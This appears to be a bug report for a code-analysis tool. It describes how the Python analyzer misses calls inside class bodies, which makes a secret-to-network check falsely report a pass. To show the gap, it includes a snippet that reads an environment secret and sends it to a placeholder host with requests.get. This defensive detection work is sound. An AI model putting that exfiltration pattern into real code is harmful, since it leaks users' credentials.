    description: "FOUND 2026-10-21 while sizing WI-nilir, on dev 9736675644. INV-bamij's family (INV-foluz: every call site an analyzer parses emits a calls edge anchored on SOME symbol); INV-bamij swept nine analyzers and noted \"Python already anchors module code on the file\", but a CLASS BODY was not part of the sweep.\n\npy.py emits no calls edge for a call in a class body outside every method. Survey of\n    import os, subprocess\n    class C:\n        subprocess.run([\"echo\", os.environ[\"K\"]])\n        x = len(\"a\")\nhas nodes C (class), C.x (field), file -- and no calls edge at all (only imports + contains).\n\nConsequence (verify-claims, host_secret -> network):\n    class C:\n        k = os.environ[\"K\"]\n        requests.get(\"http://x/\" + k)\nreads verdict=confirmed with analysis_fidelity {} -- a false all-clear. The same two lines at module level read violated.\nJS control: a static block's fetch(...) is anchored on the file pseudo-symbol (calls edge present).\n\nFix shape (INV-nopoh / INV-bamij's): anchor a class-body call on the class's own symbol (the innermost class), as Java's static initializer now is; both py.py scope walks (anchor and the var-type walk) through one helper. Measure on django/fastapi: class-body calls are common there (Meta classes, field = models.CharField(...), decorators-as-calls)."  # faa7
    fields: {}  # faa7
